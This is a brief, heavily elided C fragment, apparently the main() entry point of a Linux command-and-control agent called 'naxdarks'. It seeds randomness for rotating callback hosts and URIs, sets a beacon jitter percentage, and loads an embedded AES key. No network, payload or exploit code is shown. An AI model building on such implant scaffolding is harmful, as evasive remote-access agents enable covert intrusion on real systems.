/* nax_linux/src/main.c - Entry point for the naxdarks Linux agent */
#include "nax_linux.h"
#ifdef __has_include
...
int main(void)
{
    srand((unsigned int)time(NULL));  /* seed RNG for URI/host random rotation */
...
#  define NAX_JITTER_PCT 20u
    ...
    if (hex_to_bytes(NAX_AES_KEY, agent.cfg.aes_key, NAX_AES_KEY_SIZE) < 0) {
        fprintf(stderr, "nax: invalid AES key\n");
        return 1;
    }
#endif
